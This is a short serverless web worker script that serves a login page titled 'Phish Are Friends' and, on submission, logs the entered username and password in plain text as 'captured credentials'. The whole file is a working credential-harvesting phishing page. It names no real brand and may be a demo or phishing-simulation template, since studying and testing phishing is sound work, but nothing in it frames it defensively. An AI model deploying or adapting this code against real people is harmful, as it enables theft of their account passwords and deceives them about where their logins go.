export default {
  async fetch(request, env, ctx) {
    if (request.method === 'POST') {
      const formData = await request.formData();
      const username = formData.get('username');
      const password = formData.get('password');

      
      console.log(`Captured credentials: username=${username}, password=${password}`);

      return new Response("Credentials received. Thank you!", {
        headers: { "Content-Type": "text/plain" },
      });
    }

    
    const htmlContent = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Phish Are Friends</title>
        <style>
          body {
            font-family: sans-serif;
            max-width: 300px;
            margin: 100px auto;
            text-align: center;
          }

          input {
            display: block;
            width: 100%;
            padding: 8px;
            margin: 10px 0;
          }

          button {
            padding: 8px 16px;
            cursor: pointer;
          }
        </style>
    </head>
    <body>
      <h1>Phish Are Friends Login</h1>
      <form method="POST">
        <div class="form-group">
          <label for="username">Username</label>
          <input type="text" id="username" name="username" required>
        </div>
        <div class="form-group">
          <label for="password">Password</label>
          <input type="password" id="password" name="password" required>
        </div>
        <button type="submit">Sign In</button>
      </form>
    </body>
    </html>`;

    return new Response(htmlContent, {
      headers: { "Content-Type": "text/html" },
    });
  },
};
